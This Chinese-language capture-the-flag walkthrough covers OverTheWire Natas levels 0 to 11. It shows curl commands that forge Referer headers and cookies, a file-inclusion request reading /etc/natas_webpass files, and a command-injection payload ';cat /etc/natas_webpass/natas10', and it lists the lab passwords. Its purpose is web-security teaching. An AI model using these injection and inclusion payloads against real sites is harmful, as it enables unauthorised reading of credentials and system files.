原创： Lof_x  合天智汇

  
  

> OverTheWire 是一个 wargame 网站。其中 **Natas** 是一个适合学习 **Web安全基础** 的游戏，在 **Natas**
> 中，我们需要通过找到网站的漏洞获得通往下一关的密码。每一关都有一个网站，类似
> `http://natasX.natas.labs.overthewire.org`，其中X是每一关的编号。每一关都要输入用户名（例如，level0的用户名是natas0）及其密码才能访问。所有密码存储在
> **`/etc/natas_webpass/`**中。例如 **natas1** 的密码存储在文件
> **`/etc/natas_webpass/natas1`**中，只能由 **natas0** 和 **natas1** 读取。
>
> 网站：
>
> http://overthewire.org/wargames/natas/

 **Tips:** 所用工具：Chrome浏览器；Curl

 **Level 0 -1**

Username: natas0Password: natas0URL: http://natas0.natas.labs.overthewire.org

首先登录 **natas0** ，得到一句提示：

  1. `You can find the password for the next level on this page.`

通过查看页面源代码，发现注释掉的代码，即为 **natas1** 的密码

  1. `<div id="content">`

  2. `You can find the password for the next level on this page.`

  3. `<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->`

  4. `</div>`

Level 1 -2

Username: natas1URL: http://natas1.natas.labs.overthewire.org

登录 **natas1** ,得到一句提示：

  1. `You can find the password for the next level on this page, but rightclicking has been blocked!`

提示说，可以在这一页找到密码，但是禁用了右键功能，那我们按 **F12** 就好了，打开浏览器的开发者工具，切换到 **Elements**
选项卡，查看页面的源代码，发现了密码。

  1. `<div id="content">`

  2. `You can find the password for the`

  3. `next level on this page, but rightclicking has been blocked!`

  4. `<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->`

  5. `</div>`

Level 2 -3

Username: natas2URL: http://natas2.natas.labs.overthewire.org

登录 **natas2** ，提示如下：

  1. `There is nothing on this page `

查看页面源代码中没有发现进入下一关的密码，但是发现了一个 `img`标签，引用了一张图片

  1. `<div id="content">`

  2. `There is nothing on this page`

  3. `<img src="files/pixel.png">`

  4. `</div>`

  5. `</body></html>`

访问这个链接：
`http://natas2.natas.labs.overthewire.org/files/pixel.png`，没有什么发现，试试访问它的上一级路径：
`http://natas2.natas.labs.overthewire.org/files/`，发现是一个允许列目录的路径。

  1. `index of /files`

  2. `[ICO] Name Last modified Size Description`

  3. `[PARENTDIR] Parent Directory - `

  4. `[IMG] pixel.png 2016-12-15 16:07 303 `

  5. `[TXT] users.txt 2016-12-20 05:15 145 `

  6. `Apache/2.4.10 (Debian) Server at natas2.natas.labs.overthewire.org Port 80`

访问 **users.txt** ，发现密码

  1. `# username:password`

  2. `alice:BYNdCesZqW`

  3. `bob:jw2ueICLvT`

  4. `charlie:G5vCxkVV3m`

  5. `natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`

  6. `eve:zo4mJWyNj2`

  7. `mallory:9urtcpzBmH`

Level 3 -4

Username: natas3URL: http://natas3.natas.labs.overthewire.org

登录 **natas3** ，同样提示 `Thereisnothing onthispage`

查看页面源代码，发现一句提示：

  1. `<div id="content">`

  2. `There is nothing on this page`

  3. `<!-- No more information leaks!! Not even Google will find it this time... -->`

  4. `</div>`

说Google不会找到它，我们知道Google是搜索引擎，如果要让搜索引擎不爬取相关页面，只需要在网站下放一个
`robots.txt`文件即可，搜索引擎会遵守里面的规则，不爬取禁止的页面。

所以看看 `robots.txt`文件，访问
`http://natas3.natas.labs.overthewire.org/robots.txt`，可以看到如下内容：

  1. `User-agent: *`

  2. `Disallow: /s3cr3t/`

访问 `http://natas3.natas.labs.overthewire.org/s3cr3t/`发现一个 `users.txt`文件，得到
**natas4** 的密码。

Level 4 -5

Username: natas4URL: http://natas4.natas.labs.overthewire.org

先访问之，提示 `Accessdisallowed.Youare
visitingfrom"http://natas4.natas.labs.overthewire.org/"whileauthorized users
should come
onlyfrom"http://natas5.natas.labs.overthewire.org/"`，意思是你当前访问的页面需要从
`http://natas5.natas.labs.overthewire.org/`页面来，才能通过认证。

这里涉及一个概念: `HTTPReferer`,它是 `http header`的一部分，当浏览器向web服务器发送请求的时候，一般会带上
`Referer`，告诉服务器我是从哪个页面链接过来的。

打开浏览器的开发者工具，切换到 **Network** 选项卡，刷新页面，观察页面请求，就能发现浏览器请求
`http://natas4.natas.labs.overthewire.org`页面的请求头：

  1. `Accept: ..........`

  2. `.................`

  3. `Referer: http://natas4.natas.labs.overthewire.org/`

其中 `Referer`就是告诉浏览器当前页面是从哪个页面链接过来的，所以我们只需要把这个值改成
`http://natas5.natas.labs.overthewire.org/`就行。这里我们使用
`curl`这个工具，发送请求即可得到密码，当然也可以使用浏览器编辑请求重放功能，比如 `Firefox`就有这个功能

  1. `C:\Users\Root>curl -isu natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ natas4.natas.labs.overthewire.org --referer "http://natas5.natas.labs.overthewire.org/"`

  2. `HTTP/1.1 200 OK`

  3. `.......省略`

  4. `Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

Level 5 -6

Username: natas5URL: http://natas5.natas.labs.overthewire.org

登录后提示 `Accessdisallowed.Youarenotloggedin`。这就有点坑了，明明我们登录了，但是提示我们没有登录，这是为什么呢？

这里就不得不说 `http`协议的特点了， `http`协议是一种无状态的协议，每次传输完数据就会断开连接，那怎么才能验证身份呢，这时候就就靠
`cookie`了， `cookie`由服务器分配给浏览器的， `cookie`存储了会话状态和身份信息，之后每次 `http`请求，都会带上
`cookie`信息给服务器，服务器根据 `cookie`信息做出不同的响应。

让我们来看一下登录 `http://natas5.natas.labs.overthewire.org`之后浏览器存储的
`cookie`，同样可以通过浏览器的开发者工具查看， **Network** 选项卡中，点击请求的连接，然后点 **Cookies** 即可看到，我们看到
`cookie`信息中有个 `loggedin`的属性，它的属性值是 `0`，我们将它改成 `1`试试

  1. `C:\Users\Root>curl -isu natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq natas5.natas.labs.overthewire.org --cookie "loggedin=1"`

  2. `HTTP/1.1 200 OK`

  3. `......`

  4. `Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>`

  5. `</body>`

  6. `</html>`

得到密码。

Level 6 -7

Username: natas6URL: http://natas6.natas.labs.overthewire.org

登录后，页面提示 `Inputsecret:`,和一个 **`提交`** 按钮，还有个 `Viewsourcecode`按钮。

好像是需要我们提交一个参数，才会返回密码，我们可以点击 `Viewsourcecode`查看页面源代码，以下是关键代码：

  1. `<html>`

  2. `<div id="content">`

  3. `........`

  4. `<?`

  5. `include "includes/secret.inc";`

  6. ` if(array_key_exists("submit", $_POST)) {`

  7. ` if($secret == $_POST['secret']) {`

  8. ` print "Access granted. The password for natas7 is <censored>";`

  9. ` } else {`

  10. ` print "Wrong secret";`

  11. ` }`

  12. ` }`

  13. `?>`

  14. `<form method=post>`

  15. `Input secret: <input name=secret><br>`

  16. `<input type=submit name=submit>`

  17. `</form>`

代码的意思是，提交一个密钥，如果这个密钥和一个特定的密钥相同，便返回 `natas7`的密码，我们虽然不知道这个特殊的密钥是什么，但是代码中有一句
`include"includes/secret.inc"`，说明是用这里面的密钥作比较，我们访问这个链接试试。返回了如下内容：

  1. `<?`

  2. `$secret = "FOEIUWGHFEEUHOFUOIU";`

  3. `?>`

然后我们把这个密钥提交，然后即可得到密码：

  1. `Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

Level 7 -8

Username: natas7URL: http://natas7.natas.labs.overthewire.org

登录后，页面上有两个可以点击的按钮，分别是 **Home** 和 **About** ，对应的链接分别是
`http://natas7.natas.labs.overthewire.org/index.php?page=home`和
`http://natas7.natas.labs.overthewire.org/index.php?page=about`，查看页面源码发现有一句被注释掉的提示：

  1. `<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->`

通过浏览器观察页面请求，发现不管是访问 `home`还是 `about`都是通过
`get`方式提交参数访问的，而不是跳转。加上这句提示，这可能是文件包含漏洞，我们可以测试一下，尝试提交一些不存在的路径，比如访问
`http://natas7.natas.labs.overthewire.org/index.php?page=\`，然后会返回一些报错信息：

  1. `Warning: include(\): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21`

  2. `Warning: include(): Failed opening '\' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/natas/natas7/index.php on line 21`

这更加证实了，是通过传参，然后调用 `include()`函数。那我们把 `/etc/natas_webpass/natas8`作为参数传入。

  1. `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`

成功得到密码： `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

Level 8 -9

Username: natas8URL: http://natas8.natas.labs.overthewire.org

登录后，发现页面内容和 **`Level6-7`**是一样的。点击 `Viewsourcecode`查看页面源代码，关键代码如下：

  1. `<?`

  2. `$encodedSecret = "3d3d516343746d4d6d6c315669563362";`

  3. `function encodeSecret($secret) {`

  4. ` return bin2hex(strrev(base64_encode($secret)));`

  5. `}`

  6. `if(array_key_exists("submit", $_POST)) {`

  7. ` if(encodeSecret($_POST['secret']) == $encodedSecret) {`

  8. ` print "Access granted. The password for natas9 is <censored>";`

  9. ` } else {`

  10. ` print "Wrong secret";`

  11. ` }`

  12. `}`

  13. `?>`

  14. `<form method=post>`

  15. `Input secret: <input name=secret><br>`

  16. `<input type=submit name=submit>`

  17. `</form>`

同样需要提交一个正确的密钥，代码中给出了编码方法和编码后的结果，所以我们反着来一遍即可。

  1. `/*decode.php*/`

  2. `<?php`

  3. `echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));`

  4. `?>`

将得到的结果作为参数提交，即可得到 **natas9** 的密码：
`Accessgranted.Thepasswordfornatas9isW0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

Level 9 -10

Username: natas9URL: http://natas9.natas.labs.overthewire.org

登录后，提示 `Findwords containing:`，需要输入一些内容，然后搜索，然后会输出一些内容。

同样可以点击 `Viewsourcecode`查看页面源代码，关键代码：

  1. `Output:`

  2. `<pre>`

  3. `<?`

  4. `$key = "";`

  5. `if(array_key_exists("needle", $_REQUEST)) {`

  6. ` $key = $_REQUEST["needle"];`

  7. `}`

  8. `if($key != "") {`

  9. ` passthru("grep -i $key dictionary.txt");`

  10. `}`

  11. `?>`

  12. `</pre>`

通过代码可以看出，通过 `passthru`函数调用了 `grep`命令来查找我们提交的内容是否在
`dictionary.txt`中，但我们并不知道这个文件中有什么内容。既然调用了系统命令，我们试试命令注入吧。

> Tips：同 `exec()`函数类似， `passthru()`函数也是用来执行外部命令 `（command）`的。

我们提交 `;cat/etc/natas_webpass/natas10`，利用 `;`分号截断
`grep`命令，加上第二命令，命令注入成功，成功返回密码： `Output:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

Level 10 -11

Username: natas10URL: http://natas10.natas.labs.overthewire.org

登录后，和上一关一样，不过提示说 `Forsecurity reasons,we now filter on certain
characters（出于安全考虑，过滤了一些字符）`。

先看看关键代码：

  1. `Output:`

  2. `<pre>`

  3. `<?`

  4. `$key = "";`

  5. `if(array_key_exists("needle", $_REQUEST)) {`

  6. ` $key = $_REQUEST["needle"];`

  7. `}`

  8. `if($key != "") {`

  9. ` if(preg_match('/[;|&]/',$key)) {`

  10. ` print "Input contains an illegal character!";`

  11. ` } else {`

  12. ` passthru("grep -i $key dictionary.txt");`

  13. ` }`

  14. `}`

  15. `?>`

  16. `</pre>`

可以发现，过滤了 `;|&`这几个符号，说明不能再通过这几个符号截断 `grep`了。我们可以试试利用 `grep`本身。
`grep`是支持正则表达式的，我们试试利用正则查找，提交内容为 `[a-zA-Z]/etc/natas_webpass/natas11`，成功返回密码。
`/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`

未完待续......

